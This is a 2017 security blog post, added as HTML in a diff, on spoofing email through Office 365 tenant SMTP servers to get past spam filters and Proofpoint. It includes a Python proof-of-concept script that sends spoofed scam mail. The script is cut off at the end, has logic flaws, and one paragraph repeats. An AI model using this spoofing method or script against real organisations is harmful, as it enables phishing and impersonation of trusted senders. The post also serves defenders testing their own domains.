@@ -1,0 +1,369 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>Abusing Cloud Providers for Enhanced Phishing</title>
+    <link rel="stylesheet" href="/assets/css/style.css?v=04d53a0f8be00a33c17b1a0517d9519bbca5edcd">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  </head>
+  <body>
+      <div id="header">
+        <nav>
+          <li class="fork"><a href="http://localhost:4000">Home</a></li>
+          
+          <li class="downloads"><a href="https://insomniac-security.github.io/about">About Us</a></li>
+        </nav>
+      </div><!-- end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Abusing Cloud Providers for Enhanced Phishing</h1>
+          
+          <p>A look into how one can use poorly configured cloud mail environments to enhance their phishing campaings. Oh, and a Proofpoint bypass</p>
+          
+          <p style="text-align:center;">
+          <i><span class="credits">11 Jul 2017</span>
+          
+          <span class="credits"> - Jonathan Echavarria</span>
+          
+          </i>
+          </p>
+        </div>
+        <p>The other day, I was looking into online cloud email providers for enterprises, such as Office 365 and Google Apps for Business. This stemmed from thinking about ways to bypass email spam protections such as Proofpoint.</p>
+
+<p>There’s a utility I use called <a href="https://dnsdumpster.com">dnsdumpster</a>, which is a fantastic online service for quickly checking out the DNS records for a particular domain. You literally just type in a domain name and get back their DNS servers, their MX records, their TXT records, and a few of their A records.</p>
+
+<p>You can usually use the DNS records for a domain to quickly identify if they are utilizing any kind of cloud provider for their email.</p>
+
+<p>For example, if a domain is using Office 365, their MX record might contain <code class="highlighter-rouge">*.mail.protection.outlook.com</code>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="http://localhost:4000/static/images/2017_07_11_365phish/niuedumx.png" alt="niu mx record" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>MX record for niu.edu</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>This isn’t always necessarily the case depending on the organization, but is generally a ‘good enough indicator™’. Other indicators may be present in the SPF records for the domain, such as this SPF record for nascar.com:</p>
+
+<p><img src="http://localhost:4000/static/images/2017_07_11_365phish/nascarspf.png" alt="nascar spf record" /></p>
+
+<p>While we’re on the subject of SPF records, let’s touch quickly on how one can configure the restrictiveness of SPF records, and what they even do in the first place.</p>
+
+<p>In layman’s terms, Sender Policy Framework (SPF), is a mechanism that allows receiving mail servers to verify that incoming mail from a domain is coming from a host authorized by that domain’s administrators. At the end of the SPF record, there should be an “all” qualifier, which depending on the character before it, defines how mail is handled from any sender not already in the SPF record. <a href="https://en.wikipedia.org/wiki/Sender_Policy_Framework#Qualifiers">Wikipedia</a> has a great article that goes into much further depth on this subject. An SPF record that ends with “-all” should say that all mail not matching any other entry in the record will be a fail, and the message should go straight to spam… right?</p>
+
+<p>Well… not necessarily (more on this later).</p>
+
+<p>Going back to the MX records for Office 365, each domain is assigned it’s own <code class="highlighter-rouge">*.mail.protection.outlook.com</code> tenant. So nascar.com’s tenant is nascar-com.mail.protection.outlook.com. <a href="https://products.office.com/en-us/business/office-365-customer-stories-office-testimonials">According to Microsoft</a>, Puma is an Office 365 customer, but neither their SPF records nor their MX records give any indication of this:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="http://localhost:4000/static/images/2017_07_11_365phish/pumadumpster.png" alt="puma dns dumpster" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>MX and TXT records for puma.com</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>However, if our theory is correct, and the Microsoft customer testimonial is correct, they should use Office 365, and their mail tenant, at least in theory, should be <code class="highlighter-rouge">puma-com.mail.protection.outlook.com</code>. Let’s check if this resolves:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="http://localhost:4000/static/images/2017_07_11_365phish/pumalookup.png" alt="puma ns lookup" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>nslookup for <code class="highlighter-rouge">puma-com.mail.protection.outlook.com</code></em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Okay, that resolves, and we have confirmed that they are in fact a user of Office 365, even though their DNS records give no overt indication of this.</p>
+
+<p>Put your nostalgia glasses on, because we’re going back in time! Everyone remembers that you used to be able to pretty much connect to random SMTP servers through telnet, and spoof the source of a message to the recipient of your choice. Attackers have been abusing open SMTP relays for years, and over time, mail administrators have been doing a better job of locking down their SMTP servers to prevent this.</p>
+
+<p>So what happens when we try to relay mail off of Puma’s Office 365 mail server?</p>
+
+<p><img src="http://localhost:4000/static/images/2017_07_11_365phish/pumarelay1.png" alt="puma relay attempt" /></p>
+
+<p>As expected, we get back a message that relaying is denied for this server. This is all normally expected, but this is also the point where I got curious. Sure, I can’t necessarily use this as an open mail relay, but, what would happen if I tried to relay mail from a puma.com email to another puma.com email?</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="http://localhost:4000/static/images/2017_07_11_365phish/pumaintrarelay.png" alt="puma internal relay attempt" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>lolwut</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>I didn’t expect that at all. <strong>I haven’t authenticated with this server</strong>, why is it accepting this? Now of course, I did not actually attempt to send a message to anyone at puma.com using this, as that would be illegal (hi FBI!).</p>
+
+<p>But since the company I work for also uses Office 365, I can at least attempt to send an email to myself using our own tenant. I’ve censored the domain, but you’re probably smart enough to figure it out if you really care that much.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="http://localhost:4000/static/images/2017_07_11_365phish/workrelay.png" alt="work relay attempt" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Did… Did that just work?!</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>There’s no way that could have worked, right? RIGHT?! I mean, that would have landed in spam, it’s not like that landed in my inbox or anything, right?:</p>
+
+<p><img src="http://localhost:4000/static/images/2017_07_11_365phish/inbox1.png" alt="work relay worked" /></p>
+
+<p>Okay, this is weird. At this point, I wondered if I could spoof an email from my boss to myself</p>
+
+<p><img src="http://localhost:4000/static/images/2017_07_11_365phish/inbox2.png" alt="bossman relay worked" /></p>
+
+<p>Highlighted in the above email is the <a href="http://spamassassin.apache.org/gtube/">GTUBE Test String</a>, which, even if the email was 100% legitimate, should automatically flag it as spam, but in this case… it wasn’t…</p>
+
+<p>What is going on here? Let’s dig a little deeper.</p>
+
+<p>By analyzing the message headers, we can get a lot of extra information about the message, and the protections it encountered. An overview of the useful antispam headers can been seen in this <a href="https://technet.microsoft.com/en-us/library/dn205071(v=exchg.150).aspx">technet article</a>.</p>
+
+<p>The relevant headers that we will look at from this email are:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">Received-SPF</code>, telling us the results of the SPF record check</li>
+  <li><code class="highlighter-rouge">X-MS-Exchange-Organization-AuthAs</code>, telling us who the user authenticated as</li>
+  <li><code class="highlighter-rouge">X-Forefront-Antispam-Report</code>, giving us information about the spam engine results</li>
+</ul>
+
+<p>In this email, these headers are:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Header</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>X-Forefront-Antispam-Report</td>
+      <td>CIP:xxx.xxx.xxx.xxx;IPV:NLI;CTRY:US;EFV:NLI;SFV:SKA;SFS:;DIR:INB;SFP:;SCL:-1;SRVR:xxxxxxxxxx;H:[xxx.xxx.xxx.xxx];FPR:;SPF:None;LANG:en;</td>
+    </tr>
+    <tr>
+      <td>X-MS-Exchange-Organization-AuthAs</td>
+      <td>Anonymous</td>
+    </tr>
+    <tr>
+      <td>Received-SPF</td>
+      <td>PermError (protection.outlook.com: domain of example.com used an invalid SPF mechanism)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The IP address we sent the message from, CIP, is contained in the header, but that’s okay, we can always use a VPN (assuming it’s not on a black list of course). The SPF lookup pretty much failed.</p>
+
+<p>The values we are probably most interested in are the “<a href="https://technet.microsoft.com/en-us/library/jj200686(v=exchg.150).aspx">Spam confidence levels</a>” (SCL), SFV, which shows what happened to the message in regards to filtering, and NIL, which shows whether or not the IP we used is listed on any reputation blacklists.</p>
+
+<p>In this case, the SCL is listed as… -1?</p>
+
+<p>I should note, at this point I thought I had discovered a magical spam filter mechanism bypass, and was overjoyed. As it turns out, in Office 365, our domain was added to the spam white list. My background is not in mail administration, but it’s reasonable to assume that it’s fairly common for an admin to add their own domain to the whitelist for testing purposes, then completely forget about it.</p>
+
+<p>In addition, <strong>if you can figure out what other domains would reasonably be on your target domain’s whitelist, that also belong to Office 365, you can spoof a message from them to your target, and expect it to land in the inbox</strong>.</p>
+
+<p>You have to put some thought into this, but these whitelists will usually be much more populated than you may think. Vendors, and high priority customers for the target domain are typically added to the whitelist. Always remember that when an executive can’t get mail they expect, that’s typically a ‘resume generating event™’ for mail administrators.</p>
+
+<p>We’ve learned how we can use Office 365’s SMTP server to send spam filter bypassing messages internally, and from an Office 365 domain to another Office 365 domain. Any <code class="highlighter-rouge">*.mail.protection.outlook.com</code> server will route mail for any Office 365 domain(s). The mail will land in the inbox assuming   it’s in the spam whitelist. You can extrapolate from there how to apply this to your phishing campaigns.</p>
+
+<p>Let’s talk about <a href="https://www.proofpoint.com/">Proofpoint</a> for a second. Proofpoint sells a product that provides a “secure email inbound gateway”, and provides enhanced spam protections. For the most part, it works. Hell, it’s even caused problems for me on engagements.</p>
+
+<p>You can enumerate if a target utilizes Proofpoint by looking at their MX records; it’ll contain a <code class="highlighter-rouge">*.pphosted.com</code> entry:</p>
+
+<p><img src="http://localhost:4000/static/images/2017_07_11_365phish/pphosted.png" alt="pphosted" /></p>
+
+<p>In addition, Proofpoint doesn’t even let you internally relay mail on their SMTP servers. However… if our target is a user of both Proofpoint AND Office 365, we can use the Office 365 SMTP server for their domain to send mail into their environment, and <strong>bypass Proofpoint infrastructure entirely</strong>, as our spoofed message never hits the Proofpoint server at all!</p>
+
+<p>In addition, Proofpoint doesn’t even let you internally relay mail on their SMTP servers. However… if our target is a user of both Proofpoint AND Office 365, we can use the Office 365 SMTP server for their domain to send mail into their environment, and bypass Proofpoint infrastructure entirely, as our spoofed message never hits the Proofpoint server at all!</p>
+
+<p>For starters, be as restrictive as possible with anything you put on your spam whitelist. Anything you put there opens you up to additional risk. Next, <a href="https://blogs.msdn.microsoft.com/tzink/2015/07/21/not-using-the-additional-spam-filtering-option-for-spf-hard-fail-to-block-apparently-internal-email-spoofing/">read this article</a>, then <a href="https://blogs.msdn.microsoft.com/tzink/2015/07/21/not-using-the-additional-spam-filtering-option-for-spf-hard-fail-to-block-apparently-internal-email-spoofing/">read it again</a>, the <a href="https://blogs.msdn.microsoft.com/tzink/2015/07/21/not-using-the-additional-spam-filtering-option-for-spf-hard-fail-to-block-apparently-internal-email-spoofing/">read it one more time</a>, and start to cry as you realize you will never get the approval from anyone to get all of these recommendations in place.</p>
+
+<p>If you’d like to check if your domain is vulnerable to this, you can utilize a <a href="https://gist.github.com/Und3rf10w/6360b1432ff4a766d4047c6f80e1ae98">POC I created to test this</a>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2</span>
+
+<span class="c"># Example usage: office_365_mail_relay.py --from-addr sender@example.com --to-addr recipient@example.com --domain example.com --subject "SPAM TIME!" --from-name "John Doe" --to-name "John Smith"</span>
+<span class="c"># 20170709 - @Und3rf10w</span>
+
+<span class="kn">import</span> <span class="nn">dns.resolver</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">smtplib</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">cprint</span>
+<span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
+<span class="kn">from</span> <span class="nn">email.mime.multipart</span> <span class="kn">import</span> <span class="n">MIMEMultipart</span>
+
+<span class="c"># Required command line arguments:</span>
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">"office_365_mail_relay.py"</span><span class="p">,</span> <span class="n">usage</span><span class="o">=</span><span class="s">"</span><span class="si">%(prog)</span><span class="s">s [options]"</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s">"POC to bypass 365 spam protections from one 365 user to another, including spoofing"</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--from-addr'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The address to send the email message from"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'fromaddr'</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--to-addr'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The address to send the email message to"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'toaddr'</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--domain'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The domain of an Office 365 user to use"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'domain'</span><span class="p">)</span>
+
+<span class="c"># Optional Command line arguments:</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--smtp-server'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The *.mail.protection.outlook.com smtp server to use"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'smtpserver'</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--subject'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The subject line of the test email"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'subject'</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--from-name'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The name of the email sender"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'fromname'</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--to-name'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The name of the email recipient"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'toname'</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--eicar'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Add the eicar test string to the message body"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'eicar'</span><span class="p">)</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+<span class="n">argsdict</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+<span class="n">fromaddr</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'fromaddr'</span><span class="p">]</span>
+<span class="n">toaddr</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'toaddr'</span><span class="p">]</span>
+<span class="n">domain</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'domain'</span><span class="p">]</span>
+<span class="n">subject</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'subject'</span><span class="p">]</span>
+<span class="n">fromname</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'fromname'</span><span class="p">]</span>
+<span class="n">toname</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'toname'</span><span class="p">]</span>
+<span class="n">mx_record</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'smtpserver'</span><span class="p">]</span>
+<span class="n">eicar</span> <span class="o">=</span> <span class="n">argsdict</span><span class="p">[</span><span class="s">'eicar'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">office_365_check</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
+        <span class="s">'Grabs the SPF record for the domain'</span>
+        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">dns</span><span class="o">.</span><span class="n">resolver</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="s">'TXT'</span><span class="p">):</span>
+                <span class="k">if</span> <span class="s">'v=spf'</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="n">to_text</span><span class="p">():</span>
+                        <span class="n">domain_spf</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">to_text</span><span class="p">()</span>
+                        <span class="k">print</span> <span class="s">"[*] SPF records for "</span> <span class="o">+</span> <span class="n">domain</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">domain_spf</span>
+                        <span class="k">if</span> <span class="s">'protection.outlook.com'</span> <span class="ow">or</span> <span class="s">'sharepointonline.com'</span> <span class="ow">in</span> <span class="n">domain_spf</span><span class="p">:</span>
+                                <span class="n">cprint</span><span class="p">((</span><span class="s">"[*] "</span> <span class="o">+</span> <span class="n">domain</span> <span class="o">+</span> <span class="s">" uses Office 365, likely vulnerable to attack"</span><span class="p">),</span> <span class="s">"green"</span><span class="p">)</span>
+                                <span class="k">return</span> <span class="mi">1</span>
+                        <span class="k">else</span><span class="p">:</span>
+                                <span class="k">return</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">get_mx_record</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
+        <span class="s">'Checks for usage of proofpoint for the domain, and grabs an appropriate mx record for the domain'</span>
+        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">dns</span><span class="o">.</span><span class="n">resolver</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="s">'MX'</span><span class="p">):</span>
+                <span class="n">domain_mx</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">to_text</span><span class="p">()</span>
+                <span class="k">if</span> <span class="s">'pphosted'</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="n">to_text</span><span class="p">():</span>
+                        <span class="n">cprint</span><span class="p">((</span><span class="s">"[*] "</span> <span class="o">+</span> <span class="n">domain</span> <span class="o">+</span> <span class="s">" is protected by proofpoint, attempting to resolve the domain's Office 365 SMTP server for spam bypass"</span><span class="p">),</span> <span class="s">"yellow"</span><span class="p">)</span>
+                        <span class="n">o365_name</span> <span class="o">=</span> <span class="n">domain</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"."</span><span class="p">,</span> <span class="s">"-"</span><span class="p">)</span> <span class="o">+</span> <span class="s">".mail.protection.outlook.com."</span>
+                        <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">o365_name</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="s">"[*] MX records for "</span> <span class="o">+</span> <span class="n">domain</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">domain_mx</span>
+                        <span class="n">mx_records</span> <span class="o">=</span> <span class="n">domain_mx</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+                        <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">mx_records</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">send_mail_message</span><span class="p">(</span><span class="n">mxserver</span><span class="p">,</span> <span class="n">fromaddr</span><span class="p">,</span> <span class="n">toaddr</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="s">'Sends a message fromaddr to toaddr using mxserver'</span>
+        <span class="k">print</span> <span class="s">"[*] Establishing connection to domain's mail server @ "</span> <span class="o">+</span> <span class="n">mxserver</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">server</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">mx_record</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
+            <span class="n">server</span><span class="o">.</span><span class="n">helo</span><span class="p">()</span>
+            <span class="n">server</span><span class="o">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">fromaddr</span><span class="p">,</span> <span class="n">toaddr</span><span class="p">,</span> <span class="n">msg</span><span class="o">.</span><span class="n">as_string</span><span class="p">())</span>
+            <span class="n">cprint</span><span class="p">((</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Email sent"</span><span class="p">),</span><span class="s">"green"</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTPRecipientsRefused</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">cprint</span><span class="p">((</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Error sending to recipient "</span><span class="p">),</span><span class="s">"red"</span><span class="p">)</span>
+            <span class="n">cprint</span><span class="p">((</span><span class="s">"[-]   Recipient: "</span> <span class="o">+</span> <span class="n">toaddr</span><span class="p">),</span><span class="s">"yellow"</span><span class="p">)</span>
+            <span class="n">cprint</span><span class="p">((</span><span class="s">"[-]   Message  : "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">recipients</span><span class="p">[</span><span class="n">toaddr</span><span class="p">])),</span> <span class="s">"yellow"</span><span class="p">)</span>
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">cprint</span><span class="p">((</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Error sending message: "</span><span class="p">),</span><span class="s">"red"</span><span class="p">)</span>
+            <span class="n">cprint</span><span class="p">((</span><span class="s">"[-]  "</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)),</span> <span class="s">"yellow"</span><span class="p">)</span>
+
+<span class="c"># Add the highly spammy message</span>
+<span class="n">body</span> <span class="o">=</span> <span class="s">"""Dear Sir,
+
+I have been requested by the Nigerian National Petroleum Company to contact you for assistance in resolving a matter. The Nigerian National Petroleum Company has recently concluded a large number of contracts for oil exploration in the sub-Sahara region. The contracts have immediately produced moneys equaling US$40,000,000. The Nigerian National Petroleum Company is desirous of oil exploration in other parts of the world, however, because of certain regulations of the Nigerian Government, it is unable to move these funds to another region.
+
+You assistance is requested as a non-Nigerian citizen to assist the Nigerian National Petroleum Company, and also the Central Bank of Nigeria, in moving these funds out of Nigeria. If the funds can be transferred to your name, in your United States account, then you can forward the funds as directed by the Nigerian National Petroleum Company. In exchange for your accommodating services, the Nigerian National Petroleum Company would agree to allow you to retain 10</span><span class="si">%%</span><span class="s">, or US$4 million of this amount.
+
+However, to be a legitimate transferee of these moneys according to Nigerian law, you must presently be a depositor of at least US$100,000 in a Nigerian bank which is regulated by the Central Bank of Nigeria.
+
+If it will be possible for you to assist us, we would be most grateful. We suggest that you meet with us in person in Lagos, and that during your visit I introduce you to the representatives of the Nigerian National Petroleum Company, as well as with certain officials of the Central Bank of Nigeria.
+
+Please call me at your earliest convenience at 18-467-4975. Time is of the essence in this matter; very quickly the Nigerian Government will realize that the Central Bank is maintaining this amount on deposit, and attempt to levy certain depository taxes on it.
+
+Yours truly,
+
+Prince Alyusi Islassis</span><span class="se">\r\n</span><span class="s">"""</span>
+
+<span class="c"># Add the GTUBE test string (http://spamassassin.apache.org/gtube/)</span>
+<span class="n">body</span> <span class="o">+=</span> <span class="s">"XJS*C4JDBQADN1.NSBN3*2IDNEN*"</span>
+<span class="n">body</span> <span class="o">+=</span> <span class="s">"GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34</span><span class="se">\r\n</span><span class="s">"</span>
+
+<span class="k">if</span> <span class="n">eicar</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">(</span><span class="s">'alternative'</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">fromname</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">s &lt;</span><span class="si">%</span><span class="s">s&gt;"</span> <span class="o">%</span><span class="p">(</span><span class="n">fromname</span><span class="p">,</span> <span class="n">fromaddr</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span><span class="p">(</span><span class="n">fromaddr</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">toname</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">s &lt;</span><span class="si">%</span><span class="s">s&gt;"</span> <span class="o">%</span><span class="p">(</span><span class="n">toname</span><span class="p">,</span> <span class="n">toaddr</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span><span class="p">(</span><span class="n">toaddr</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">subject</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span><span class="p">(</span><span class="n">subject</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="c"># Add the eicar attachment if option is passed</span>
+<span class="k">if</span> <span class="n">eicar</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">eicar_string</span> <span class="o">=</span> <span class="s">"X5O!P</span><span class="si">%</span><span class="s">@AP[4</span><span class="err">\</span><span class="s">PZX54(P^)7CC)7}$EICAR-ST"</span>
+    <span class="n">eicar_string</span> <span class="o">+=</span> <span class="s">"ANDARD-ANTIVIRUS-TEST-FILE!$H+H*</span><span class="se">\r\n</span><span class="s">"</span>
+    <span class="n">attachment</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">eicar_string</span><span class="p">)</span>
+    <span class="n">attachment</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s">'Content-Disposition'</span><span class="p">,</span> <span class="s">'attachment'</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s">'eicar.txt'</span><span class="p">)</span>
+    <span class="n">msg</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">attachment</span><span class="p">)</span>
+
+<span class="n">content</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s">'plain'</span><span class="p">)</span>
+<span class="n">msg</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="c"># Check to see whether 'domain' uses office 365</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">office_365_check</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
